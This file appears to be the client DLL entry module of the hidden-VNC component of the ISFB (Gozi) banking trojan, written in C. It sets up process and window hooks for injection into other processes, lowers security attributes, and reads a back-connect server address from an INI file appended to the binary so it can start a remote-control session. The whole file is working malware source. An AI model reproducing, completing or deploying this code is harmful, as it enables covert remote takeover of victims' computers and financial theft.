//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: client.c
// $Revision: 166 $
// $Date: 2014-02-14 19:47:48 +0400 (Пт, 14 фев 2014) $
// description: 
//	Client dll entry point, initialization and cleanup routines.


#include "vncmain.h"
#include "vncwnd.h"
#include "wndhook.h"
#include "joiner.h"
#include "ini.h"
#include "..\acdll\activdll.h"

#ifdef _BC_CLIENT
 #include "..\bcclient\bcclient.h"
 LPTSTR	GenGuidName(PULONG pSeed, LPTSTR Prefix OPTIONAL, LPTSTR Postfix OPTIONAL);
#endif

#define		szUnknown		"UNKNOWN"

HANDLE						g_AppHeap = 0;				// current DLL heap
static LONG volatile		g_AttachCount = 0;			// number of process attaches
static BOOL					g_DllInitStatus = FALSE;	
BOOL						g_bServerDll = FALSE;
PVOID						g_hServer = NULL;


// from vnchook.c
extern	WINERROR VncHookActivate(VOID);

// from vncsrv.c
extern	WINERROR VncServerInit(HMODULE hModule);
extern	VOID VncServerCleanup(VOID);
extern	WINERROR VncStartServerEx(PVOID* pServerHandle, SOCKADDR_IN* pServerAddress, LPTSTR pClientId, ULONG BcTimeout, BOOL bWaitConnect);
extern	VOID VncStopServerEx(PVOID ServerHandle);

// from isfb.c
WINERROR IsfbInitClient(VOID);
LPTSTR IsfbLoadClientId(VOID);

#define	CRC_BCSERVER	0x9fd13931	
#define	CRC_BCTIMEOUT	0x6de85128

PVOID __stdcall	AppAlloc(ULONG Size)
{
	return(hAlloc(Size));
}

VOID __stdcall	AppFree(PVOID pMem)
{
	hFree(pMem);
}

PVOID __stdcall	AppRealloc(PVOID pMem, ULONG Size)
{
	return(hRealloc(pMem, Size));
}


//
//	Searches for INI file attached to the current module. Resolves BC-Server address from the file.
//
BOOL ClientLoadIniFile(
	SOCKADDR_IN*	pAddr,
	PULONG			pTimeout
	)
{
	BOOL	Ret = FALSE;
	PCHAR	pValue, pClientIni;
	ULONG	ClientIniSize, iValue;
	PINI_PARAMETERS	pIniParams;

	// Loading attached INI-file
	if (GetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, &pClientIni, &ClientIniSize, FALSE, 0, TARGET_FLAG_BINARY))
	{
		pClientIni[ClientIniSize] = 0;

		if (IniParseParamFile(pClientIni, &pIniParams, FALSE, TRUE) == NO_ERROR)
		{
			if (pValue = IniGetParamValue(CRC_BCSERVER, pIniParams))
			{
				StringToTcpAddress(pValue, pAddr);
				Ret = TRUE;
			}

			if ((pValue = IniGetParamValue(CRC_BCTIMEOUT, pIniParams)) && StrToIntEx(pValue, 0, &iValue))
				*pTimeout = iValue;
			
			hFree(pIniParams);
		}	// if (IniParseParamFile(pClientIni, &pIniParams, FALSE, TRUE) == NO_ERROR)
		hFree(pClientIni);
	}	// if (GetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, &pClientIni, &ClientIniSize, FALSE, 0, TARGET_FLAG_BINARY))

	return(Ret);
}


// ----- DLL startup and cleanup routines -------------------------------------------------------------------------------




//
//	Client DLL initialization routine.
//
static WINERROR ClientStartup(
	HMODULE hModule,	// Current DLL base
	PVOID	pContext	// Active DLL context pointer
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	DbgPrint("ClientStartup\n");

	do	// not a loop
	{
		// create heap for allocations
		if ((g_AppHeap = HeapCreate(0, 2048000, 0)) == NULL)
			break;

		// init global variables
		if ((Status = InitGlobals(hModule, G_SYSTEM_VERSION | G_CURRENT_PROCESS_ID | G_APP_SHUTDOWN_EVENT | G_CURRENT_PROCESS_PATH)) != NO_ERROR)
			break;

#if !(_INJECT_AS_IMAGE)
		if ((Status = PsSupGetModulePath(g_CurrentModule, &g_CurrentModulePath) != NO_ERROR))
			break;
#endif

		// Initializing hoking engine
		if ((Status = InitHooks()) != NO_ERROR){
			DbgPrint("VncServerInit failed with status %u.\n", Status);
			break;
		}

		// Initializing default security attributes
		if (LOBYTE(LOWORD(g_SystemVersion)) > 5)
			LsaSupInitializeLowSecurityAttributes(&g_DefaultSA);
		else
			LsaSupInitializeDefaultSecurityAttributes(&g_DefaultSA);

		// Initializing VNC-specific callbacks

		g_pChangeDesktopNameA = &VncChangeDesktopNameA;
		g_pChangeDesktopNameW = &VncChangeDesktopNameW;
		g_pOnCreateProcessA = &VncOnCreateProcessA;
		g_pOnCreateProcessW = &VncOnCreateProcessW;
		g_pOnThreadAttach = &WndHookOnThreadAttach;
		g_pOnThreadDetach = &WndHookOnThreadDetach;

		//TEST
		//Sleep ( 10000 );

		// Init vnc app staff
		if ((Status = VncServerInit(hModule)) != NO_ERROR)
		{
			if ( Status == ERROR_FILE_NOT_FOUND )
			{
				// VNC shared section was not initialized. This means we are not within VNC session process.
				//Status = NO_ERROR;
				AcStartup(pContext, FALSE);
			}
			else
			{
				DbgPrint("VncServerInit failed with status %u.\n", Status);				
			}
			break;
		}

		// we are good, activate hooks
		// Initializing active DLL engine
		if (((Status = AcStartup(pContext, TRUE)) != NO_ERROR) && (Status != ERROR_FILE_NOT_FOUND))
		{
			DbgPrint("Active DLL startup failed with status %u.\n", Status);
			break;
		}

		// set user hooks: u32, gdi, etc
		Status = VncHookActivate();
		if ( Status != NO_ERROR ){
			DbgPrint("VncHookActivate 2 failed status=%lu\n", Status);
		}

		WndHookStartup();

	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return(Status);
}


//
//	Client DLL cleanup routine. It can be called only if previouse ClientStartup() finished successfully.
//
static WINERROR ClientCleanup(VOID)
{
	WINERROR Status = NO_ERROR;

	if (g_AppShutdownEvent)
	{
		SetEvent(g_AppShutdownEvent);

		CleanupHooks();

		// --------------------------------------------------------------------------------------------------------------
		// Place your DLL-cleanup code here
		// --------------------------------------------------------------------------------------------------------------
		VncServerCleanup();

		// Releasing default security attributes
		LsaSupFreeSecurityAttributes(&g_DefaultSA);

		ReleaseGlobals();
		if (g_AppHeap)
			HeapDestroy(g_AppHeap);
	}	// if (g_AppShutdownEvent)
	
	return(Status);
}


//
//	Our DLL entry point.	
//
BOOL APIENTRY DllMain(
	HMODULE	hModule,
	DWORD	ul_reason_for_call,
	LPVOID	lpReserved
	)
{
	WINERROR Status = NO_ERROR;


	switch(ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		// The DLL can be attached to a process multiple times (as AppInit and as AppCert, for example)
		// Perform an initialization only once, other times just return g_DllInitStatus
		if (_InterlockedIncrement(&g_AttachCount) == 1)
		{
			PCHAR	ProcessPath = NULL, ProcessName = szUnknown;
			g_CurrentModule = hModule;

#if	_DBG
			// Getting current process name.
			if (ProcessPath = Alloc(MAX_PATH))
			{
				GetModuleFileName(GetModuleHandle(NULL), ProcessPath, MAX_PATH);
				ProcessName = strrchr(ProcessPath, '\\') + 1;
			}
#endif

			DbgPrint("VNC server DLL version 1.0.\n");
#ifdef _WIN64
			DbgPrint("Attached to 64-bit process \"%s\" at 0x%x.\n", ProcessName, (ULONG_PTR)hModule);
#else
			DbgPrint("Attached to 32-bit process \"%s\" at 0x%x.\n", ProcessName, (ULONG_PTR)hModule);
#endif
			//TEST
			//Sleep(10000);

			Status = ClientStartup(hModule, lpReserved);
			if ( Status == NO_ERROR)
			{
				g_DllInitStatus = TRUE;

				// Attaching APP main thread
				WndHookOnThreadAttach(GetCurrentThreadId());
			}
			else if ( Status == ERROR_FILE_NOT_FOUND )
			{
#ifdef	_START_ON_DLL_LOAD
				SOCKADDR_IN	sAddr = {0};
				ULONG		ConnectTimeout = 0;
				LPTSTR		ClientId = NULL;
				sAddr.sin_family = AF_INET;
				sAddr.sin_port = htons(RFB_DEFAULT_SERVER_PORT);

				ClientLoadIniFile(&sAddr, &ConnectTimeout);
				VncStartServerEx(&g_hServer, &sAddr, ClientId, ConnectTimeout, FALSE);
#endif
				g_bServerDll = TRUE;
				g_DllInitStatus = TRUE;
				DbgPrint("Started as in-server dll\n");
			}
			else
			{
				g_DllInitStatus = FALSE;
				DbgPrint("Startup failed with status %u.\n", Status);
			}

		}	// if (_InterlockedIncrement(&g_AttachCount) == 1)
		break;

	case DLL_THREAD_ATTACH:
		ASSERT(g_DllInitStatus);
		if ( !g_bServerDll ){
			WndHookOnThreadAttach(GetCurrentThreadId());
		}
		break;

	case DLL_THREAD_DETACH:
		ASSERT(g_DllInitStatus);
		if ( !g_bServerDll ){
			WndHookOnThreadDetach(GetCurrentThreadId());
		}
		break;

	case DLL_PROCESS_DETACH:
		// Perform a detach only once: when attach count is 0
		if (_InterlockedDecrement(&g_AttachCount) == 0)
		{
#ifdef	_START_ON_DLL_LOAD
			if (g_bServerDll && g_hServer)
				VncStopServerEx(g_hServer);
#endif
			// Checking if the DLL was successfully initialized before
			if (g_DllInitStatus)
				ClientCleanup();
#ifdef _WIN64
			DbgPrint("Detached from the 64-bit process.\n");
#else
			DbgPrint("Detached from the 32-bit process.\n");
#endif
		}	// if (_InterlockedDecrement(&g_AttachCount) == 0)
		break;
	default:
		ASSERT(FALSE);
		
	}

	return(g_DllInitStatus);
}


// just a stub to bypass CRT entry 
LONG _cdecl main(VOID)
{
}

// Required to link with ntdll.lib
ULONG  __security_cookie;
